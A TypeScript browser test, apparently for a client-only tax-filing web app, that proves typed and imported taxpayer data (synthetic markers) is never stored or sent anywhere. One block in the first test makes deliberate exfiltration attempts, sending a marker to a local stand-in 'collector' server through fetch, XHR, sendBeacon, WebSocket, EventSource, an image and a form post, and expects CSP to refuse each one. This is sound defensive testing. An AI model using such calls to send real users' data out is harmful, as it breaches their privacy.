import fs from 'fs';
import http from 'http';
import path from 'path';
import yaml from 'js-yaml';
import type { AddressInfo } from 'net';
import { chromium, type Browser, type BrowserContext, type Page, type Request } from 'playwright-core';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { scenarioFactGraphJson } from '../../saveState/saveStateTestUtils.js';
import { createSaveState } from '../../saveState/saveStateSchema.js';
import { DEVICE_SAVE_KEY } from '../../saveState/deviceSaveStore.js';
import { isEncryptedEnvelope } from '../../saveState/saveStateCrypto.js';
import { startStagedSiteServer, type StagedSiteServer } from './stagedSiteServer.js';

/**
 * No-retention proof for the static client-only build, in a real browser (#132, #126).
 *
 * Runs the staged site (`npm run build:static && npm run stage:static`) in headless Chrome, served locally with the
 * site's own `_headers` and `_redirects`, and drives the app the way a person would: start a return, type a name,
 * date of birth, address and phone number into the interview (autosave), then import a golden end-to-end scenario
 * (synthetic data) save file carrying a TIN and a wage amount. Every value typed or imported is a unique marker.
 *
 * Asserted for the whole session, across every page, worker and service worker in the browser context:
 * - every request is a same-origin GET for a static asset with no body; a query string appears only on a reload of
 *   an interview URL, and then holds only the app's own collection-item ids (random UUIDs);
 * - no request to the `.invalid` API origin or any other origin; nothing reaches a second local "collector" server,
 *   even when the page deliberately tries fetch, XMLHttpRequest, sendBeacon, WebSocket, EventSource, a
 *   cross-origin image and a form post to it;
 * - no request URL, header or body contains a marker, in plain text, URL-encoded or base64;
 * - the CSP is sent as a response header with connect-src, form-action and frame-ancestors 'none' and no unsafe-*
 *   script source;
 * - after the session and again after a reload, localStorage, sessionStorage, IndexedDB, Cache Storage, cookies and
 *   service-worker registrations are empty and the return is gone;
 * - only an explicit "Save on this device" writes, and what it writes is one AES-GCM envelope with no marker and
 *   no passphrase in it; "Clear all data on this device" removes it, and nothing comes back after a reload.
 *
 * Chrome comes from CHROME_PATH, or else Playwright's `chrome` channel (the installed Google Chrome). No browser is
 * downloaded, and nothing outside 127.0.0.1 is contacted: requests to any other host are aborted and fail the test.
 */

const APP_DIR = path.resolve(__dirname, `../../..`);
const SITE_DIR = path.resolve(APP_DIR, `../cloudflare-pages/out`);

type Section = Record<string, string>;
const t = (
  yaml.load(fs.readFileSync(path.join(APP_DIR, `src/locales/en.saveState.yaml`), `utf8`)) as {
    account: { deviceData: { title: string; export: Section; import: Section; device: Section; clear: Section } };
  }
).account.deviceData;

/** Typed into the interview. */
const UI = {
  firstName: `Quillonmark`,
  lastName: `Zephyrcanary`,
  street: `88 Vantablue Court`,
  phone: `2025550147`,
};
/** Carried by the imported save file. */
const FILE = {
  firstName: `Orrinwisp`,
  lastName: `Thistlecanary`,
  tin: { area: `900`, group: `70`, serial: `0001` },
  wages: `73519.47`,
};
/** The phone and TIN as the fact graph stores them. */
const PHONE_JSON = `"areaCode":"202","officeCode":"555","lineNumber":"0147"`;
const TIN_JSON = `"area":"900","group":"70","serial":"0001"`;
const MARKERS = [
  UI.firstName,
  UI.lastName,
  `Vantablue`,
  UI.phone,
  `202-555-0147`,
  PHONE_JSON,
  FILE.firstName,
  FILE.lastName,
  `900700001`,
  `900-70-0001`,
  TIN_JSON,
  FILE.wages,
  `73,519.47`,
];
const PASSPHRASE = `lantern orchard granite 42`;
const UUID = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;

/** A marker as it could appear in a request: plain, lowercased, URL-encoded, or inside base64 (any alignment). */
function encodings(marker: string): string[] {
  const forms = new Set([
    marker,
    marker.toLowerCase(),
    encodeURIComponent(marker),
    encodeURIComponent(marker).replace(/%20/g, `+`),
  ]);
  for (const pad of [``, `a`, `aa`]) {
    const b64 = Buffer.from(pad + marker).toString(`base64`);
    // Drop the characters that depend on the bytes around the marker.
    const start = pad.length === 0 ? 0 : pad.length === 1 ? 3 : 4;
    const core = b64.slice(start, b64.length - 4);
    if (core.length >= 8) {
      forms.add(core);
      forms.add(core.replace(/\+/g, `-`).replace(/\//g, `_`));
    }
  }
  return [...forms];
}
const MARKER_FORMS = MARKERS.flatMap((m) => encodings(m).map((form) => ({ marker: m, form })));
const findMarkers = (text: string) => [
  ...new Set(MARKER_FORMS.filter(({ form }) => text.includes(form)).map((f) => f.marker)),
];

/** The scenario's facts with the markers written into the primary filer and the W-2. */
function markerSaveFile(): string {
  const facts = scenarioFactGraphJson() as Record<string, { $type: string; item: unknown }>;
  const primary = Object.keys(facts)
    .find((k) => k.endsWith(`/isPrimaryFiler`) && facts[k].item === true)
    ?.replace(/\/isPrimaryFiler$/, ``);
  const w2 = (facts[`/formW2s`].item as { items: string[] }).items[0];
  expect(primary).toBeTruthy();
  facts[`${primary}/firstName`] = { $type: `gov.irs.factgraph.persisters.StringWrapper`, item: FILE.firstName };
  facts[`${primary}/lastName`] = { $type: `gov.irs.factgraph.persisters.StringWrapper`, item: FILE.lastName };
  facts[`${primary}/tin`] = { $type: `gov.irs.factgraph.persisters.TinWrapper`, item: FILE.tin };
  facts[`/formW2s/#${w2}/writableWages`] = { $type: `gov.irs.factgraph.persisters.DollarWrapper`, item: FILE.wages };
  const text = JSON.stringify(createSaveState(facts));
  expect(findMarkers(text)).toEqual(expect.arrayContaining([FILE.firstName, FILE.lastName, TIN_JSON, FILE.wages]));
  return text;
}

type Recorded = {
  method: string;
  url: string;
  resourceType: string;
  body: string | null;
  headers: string;
  /** Set when the browser refused the request itself (for example `net::ERR_BLOCKED_BY_CSP`). */
  failure?: string;
};

/** A second origin that the page must never reach. */
async function startCollector() {
  const hits: string[] = [];
  const server = http.createServer((req, res) => {
    hits.push(`${req.method} ${req.url}`);
    res.writeHead(204).end();
  });
  server.on(`upgrade`, (req, socket) => {
    hits.push(`UPGRADE ${req.url}`);
    socket.destroy();
  });
  await new Promise<void>((resolve) => server.listen(0, `127.0.0.1`, resolve));
  const { port } = server.address() as AddressInfo;
  return {
    origin: `http://127.0.0.1:${port}`,
    hits,
    close: () =>
      new Promise<void>((resolve) => {
        server.closeAllConnections();
        server.close(() => resolve());
      }),
  };
}

describe(`static client: no taxpayer data is kept in the browser or sent anywhere (real browser)`, () => {
  let site: StagedSiteServer;
  let collector: Awaited<ReturnType<typeof startCollector>>;
  let browser: Browser;
  let saveFile: string;

  beforeAll(async () => {
    if (!fs.existsSync(path.join(SITE_DIR, `index.html`))) {
      throw new Error(`${SITE_DIR} not found: run npm run build:static && npm run stage:static first`);
    }
    saveFile = markerSaveFile();
    site = await startStagedSiteServer(SITE_DIR);
    collector = await startCollector();
    browser = await chromium.launch(
      process.env.CHROME_PATH ? { executablePath: process.env.CHROME_PATH } : { channel: `chrome` }
    );
  }, 60_000);

  afterAll(async () => {
    await browser?.close();
    await collector?.close();
    await site?.close();
  });

  /** A fresh profile whose every request (pages, workers, service workers) is recorded. */
  async function newSession() {
    const context = await browser.newContext({ acceptDownloads: true, serviceWorkers: `allow` });
    const requests: Request[] = [];
    const aborted: string[] = [];
    context.on(`request`, (r) => requests.push(r));
    await context.route(`**/*`, (route) => {
      const url = route.request().url();
      // Let the collector through so a request that escaped the page's defenses would be seen there too.
      if (url.startsWith(`${site.origin}/`) || url.startsWith(`${collector.origin}/`)) return route.continue();
      aborted.push(`${route.request().method()} ${url}`);
      return route.abort(`blockedbyclient`);
    });
    const page = await context.newPage();
    page.setDefaultTimeout(20_000);
    const recorded = () =>
      Promise.all(
        requests.map(
          async (r): Promise<Recorded> => ({
            method: r.method(),
            url: r.url(),
            resourceType: r.resourceType(),
            body: r.postData(),
            headers: JSON.stringify(await r.allHeaders().catch(() => r.headers())),
            failure: r.failure()?.errorText,
          })
        )
      );
    return { context, page, recorded, aborted };
  }

  const snapshotStorage = async (context: BrowserContext, page: Page) => {
    const inPage = await page.evaluate(async () => {
      const entries = (s: Storage) => Object.keys(s).map((k) => [k, s.getItem(k) ?? ``] as [string, string]);
      return {
        localStorage: entries(localStorage),
        sessionStorage: entries(sessionStorage),
        indexedDB: (await indexedDB.databases()).map((d) => d.name ?? ``),
        cacheStorage: await caches.keys(),
        serviceWorkers: (await navigator.serviceWorker.getRegistrations()).map((r) => r.scope),
        documentCookie: document.cookie,
      };
    });
    const cookies = (await context.cookies()).map((c) => `${c.name}=${c.value}`);
    return { ...inPage, cookies, contextServiceWorkers: context.serviceWorkers().map((w) => w.url()) };
  };

  const EMPTY = {
    localStorage: [],
    sessionStorage: [],
    indexedDB: [],
    cacheStorage: [],
    serviceWorkers: [],
    documentCookie: ``,
    cookies: [],
    contextServiceWorkers: [],
  };

  /**
   * `deliberate` are the exfiltration attempts made on purpose; each must have been refused by the browser itself
   * (CSP), so it never reached the network. Every other request must be a plain same-origin asset GET.
   */
  async function assertNetwork(recorded: () => Promise<Recorded[]>, aborted: string[]) {
    const all = await recorded();
    expect(all.length).toBeGreaterThan(0);
    // blob: URLs are the in-page save file downloads; they never leave the browser.
    const network = all.filter((r) => !r.url.startsWith(`blob:`) && !r.url.startsWith(`data:`));
    const deliberate = network.filter((r) => r.url.startsWith(`${collector.origin}/`));
    // Chromium reports these as failed with reason `csp` (net::ERR_BLOCKED_BY_CSP).
    expect(deliberate.filter((r) => !/csp/i.test(r.failure ?? ``)).map((r) => [r.url, r.failure])).toEqual([]);
    const sent = network.filter((r) => !deliberate.includes(r));
    expect(aborted).toEqual([]);
    expect(sent.filter((r) => !r.url.startsWith(`${site.origin}/`)).map((r) => r.url)).toEqual([]);
    expect(sent.filter((r) => r.url.includes(`.invalid`)).map((r) => r.url)).toEqual([]);
    expect(sent.filter((r) => r.method !== `GET`).map((r) => `${r.method} ${r.url}`)).toEqual([]);
    expect(sent.filter((r) => r.body !== null).map((r) => r.url)).toEqual([]);
    const badQuery = sent.filter((r) => {
      const { searchParams, search } = new URL(r.url);
      if (!search) return false;
      return r.resourceType !== `document` || [...searchParams.values()].some((v) => !UUID.test(v));
    });
    expect(badQuery.map((r) => r.url)).toEqual([]);
    const leaks = sent.flatMap((r) =>
      findMarkers(`${r.url}\n${r.headers}\n${r.body ?? ``}`).map((m) => `${m} in ${r.url}`)
    );
    expect(leaks).toEqual([]);
    expect(collector.hits).toEqual([]);
    expect(site.requests.filter((r) => r.method !== `GET` || r.body !== ``)).toEqual([]);
  }

  const startReturn = async (page: Page) => {
    await page.getByRole(`button`, { name: /^Start my \d{4} federal tax return$/ }).click();
    await page.waitForURL(/\/pre-checklist/);
    await page.getByRole(`button`, { name: `Continue`, exact: true }).click();
    await page.waitForURL(/\/load-taxpayer-info/);
    await page.getByRole(`button`, { name: `Continue`, exact: true }).click();
    await page.waitForURL(/\/checklist/);
  };

  /**
   * In-app (history API) navigation to the device data page: no page load, so the in-memory return stays, as when
   * the page is opened from the Account page.
   */
  const openDeviceData = async (page: Page) => {
    await page.evaluate(() => {
      window.history.pushState({}, ``, `/df/file/account/device-data`);
      window.dispatchEvent(new PopStateEvent(`popstate`));
    });
    await page.getByRole(`heading`, { name: t.title, level: 1 }).waitFor();
  };

  const statusShows = (page: Page, text: string) =>
    page.getByTestId(`device-data-status`).filter({ hasText: text }).waitFor();

  const exportPlaintext = async (page: Page) => {
    await page.locator(`label[for="export-plaintext-ack"]`).click();
    expect(await page.locator(`#export-plaintext-ack`).isChecked()).toBe(true);
    const [download] = await Promise.all([
      page.waitForEvent(`download`),
      page.getByRole(`button`, { name: t.export.button }).click(),
    ]);
    const text = fs.readFileSync(await download.path(), `utf8`);
    await download.delete();
    return text;
  };

  const importSaveFile = async (page: Page) => {
    await page.locator(`#import-file`).setInputFiles({
      name: `scenario.json`,
      mimeType: `application/json`,
      buffer: Buffer.from(saveFile),
    });
    await page.getByRole(`button`, { name: t.import.button }).click();
    await statusShows(page, t.import.done);
  };

  it(`keeps nothing after the session or a reload, and sends nothing`, async () => {
    const { context, page, recorded, aborted } = await newSession();
    const home = await page.goto(`${site.origin}/df/file/home`);

    // The CSP is enforced from the response header, not only the <meta> tag.
    const csp = home?.headers()[`content-security-policy`] ?? ``;
    const directive = (name: string) =>
      csp
        .split(`;`)
        .map((d) => d.trim())
        .find((d) => d.startsWith(`${name} `));
    expect(directive(`connect-src`)).toBe(`connect-src 'none'`);
    expect(directive(`form-action`)).toBe(`form-action 'none'`);
    expect(directive(`frame-ancestors`)).toBe(`frame-ancestors 'none'`);
    expect(directive(`script-src`)).toBeTruthy();
    expect(directive(`script-src`)).not.toContain(`unsafe-`);

    // Interview: name, date of birth, address and phone, each saved with "Save and continue" (autosave).
    await startReturn(page);
    await page.getByRole(`link`, { name: `Start`, exact: true }).click();
    await page.waitForURL(/\/about-you-intro/);
    await page.getByRole(`button`, { name: `Continue`, exact: true }).click();
    await page.waitForURL(/\/about-you-basic-info/);
    await page.locator(`input[id$="/firstName"]`).fill(UI.firstName);
    await page.locator(`input[id$="/lastName"]`).fill(UI.lastName);
    await page.locator(`#month`).fill(`04`);
    await page.locator(`#day`).fill(`17`);
    await page.locator(`#year`).fill(`1983`);
    await page.getByRole(`button`, { name: `Save and continue` }).click();
    await page.waitForURL(/\/about-you-contact-info/);
    await page.getByLabel(/^Address/).fill(UI.street);
    await page.locator(`[id="id-/address__city"]`).fill(`Amarillo`);
    await page.locator(`[id="id-/address__stateOrProvence"]`).selectOption({ label: `Texas` });
    await page.locator(`[id="id-/address__postalCode"]`).fill(`79101`);
    await page.locator(`[id="id-/phone"]`).fill(UI.phone);
    await page.getByRole(`button`, { name: `Save and continue` }).click();
    await page.waitForURL(/\/about-you-occupation/);

    // The typed answers are in the return held by the page...
    await openDeviceData(page);
    expect(findMarkers(await exportPlaintext(page))).toEqual(
      expect.arrayContaining([UI.firstName, UI.lastName, `Vantablue`, PHONE_JSON])
    );
    // ...and so are the imported TIN and wages.
    await importSaveFile(page);
    expect(findMarkers(await exportPlaintext(page))).toEqual(
      expect.arrayContaining([FILE.firstName, FILE.lastName, TIN_JSON, FILE.wages])
    );

    // Deliberate exfiltration attempts with a marker are all refused before they reach the network.
    const attempts = await page.evaluate(
      async ({ target, marker }) => {
        const outcome = async (fn: () => Promise<unknown> | unknown) => {
          try {
            await fn();
            return `sent`;
          } catch {
            return `refused`;
          }
        };
        const img = await new Promise<string>((resolve) => {
          const i = new Image();
          i.onload = () => resolve(`sent`);
          i.onerror = () => resolve(`refused`);
          i.src = `${target}/img?m=${marker}`;
        });
        const form = await new Promise<string>((resolve) => {
          document.addEventListener(`securitypolicyviolation`, (e) => {
            if (e.violatedDirective === `form-action`) resolve(`refused`);
          });
          const f = document.createElement(`form`);
          f.method = `post`;
          f.action = `${target}/form`;
          f.target = `_blank`;
          const input = document.createElement(`input`);
          input.name = `m`;
          input.value = marker;
          f.appendChild(input);
          document.body.appendChild(f);
          f.submit();
          f.remove();
          setTimeout(() => resolve(`no violation reported`), 3000);
        });
        return {
          fetch: await outcome(() => fetch(`${target}/fetch`, { method: `POST`, body: marker })),
          xhr: await outcome(() => {
            const x = new XMLHttpRequest();
            x.open(`POST`, `${target}/xhr`);
            x.send(marker);
          }),
          beacon: navigator.sendBeacon(`${target}/beacon`, marker) ? `sent` : `refused`,
          webSocket: await outcome(() => new WebSocket(`${target.replace(/^http/, `ws`)}/ws?m=${marker}`)),
          eventSource: await outcome(() => new EventSource(`${target}/sse?m=${marker}`)),
          img,
          form,
        };
      },
      { target: collector.origin, marker: FILE.lastName }
    );
    expect(attempts).toEqual({
      fetch: `refused`,
      xhr: `refused`,
      beacon: `refused`,
      webSocket: `refused`,
      eventSource: `refused`,
      img: `refused`,
      form: `refused`,
    });

    // Nothing is kept on the device during the session...
    expect(await snapshotStorage(context, page)).toEqual(EMPTY);
    // ...or after a reload, and the return is gone.
    await page.reload();
    await page.waitForLoadState(`load`);
    await page.goto(`${site.origin}/df/file/home`);
    await page.getByRole(`button`, { name: /^Start my \d{4} federal tax return$/ }).waitFor();
    expect(findMarkers(await page.content())).toEqual([]);
    expect(await snapshotStorage(context, page)).toEqual(EMPTY);

    await assertNetwork(recorded, aborted);
    await context.close();
  }, 180_000);

  it(`writes only an encrypted copy on an explicit save, and "Clear all data" removes it`, async () => {
    const { context, page, recorded, aborted } = await newSession();
    await page.goto(`${site.origin}/df/file/home`);
    await startReturn(page);
    await openDeviceData(page);
    await importSaveFile(page);

    await page.locator(`#device-passphrase`).fill(PASSPHRASE);
    await page.getByRole(`button`, { name: t.device.saveButton }).click();
    await statusShows(page, t.device.saved);

    const assertOnlyEnvelope = async () => {
      const stored = await snapshotStorage(context, page);
      expect({ ...stored, localStorage: [] }).toEqual(EMPTY);
      expect(stored.localStorage.map(([k]) => k)).toEqual([DEVICE_SAVE_KEY]);
      const value = stored.localStorage[0][1];
      expect(isEncryptedEnvelope(JSON.parse(value))).toBe(true);
      expect(findMarkers(value)).toEqual([]);
      expect(value).not.toContain(PASSPHRASE);
      expect(findMarkers(JSON.stringify(stored))).toEqual([]);
    };
    await assertOnlyEnvelope();

    // A reload drops the in-memory return but keeps the encrypted copy, which the passphrase opens again.
    await page.reload();
    await page.goto(`${site.origin}/df/file/home`);
    await assertOnlyEnvelope();
    await startReturn(page);
    await openDeviceData(page);
    await page.locator(`#device-passphrase`).fill(PASSPHRASE);
    await page.getByRole(`button`, { name: t.device.loadButton }).click();
    await statusShows(page, t.device.loaded);
    expect(findMarkers(await exportPlaintext(page))).toEqual(
      expect.arrayContaining([FILE.firstName, FILE.lastName, TIN_JSON, FILE.wages])
    );

    await page.getByRole(`button`, { name: t.clear.button }).click();
    await statusShows(page, t.clear.done);
    expect(await snapshotStorage(context, page)).toEqual(EMPTY);
    await page.reload();
    await page.goto(`${site.origin}/df/file/home`);
    expect(await snapshotStorage(context, page)).toEqual(EMPTY);

    await assertNetwork(recorded, aborted);
    await context.close();
  }, 180_000);
});
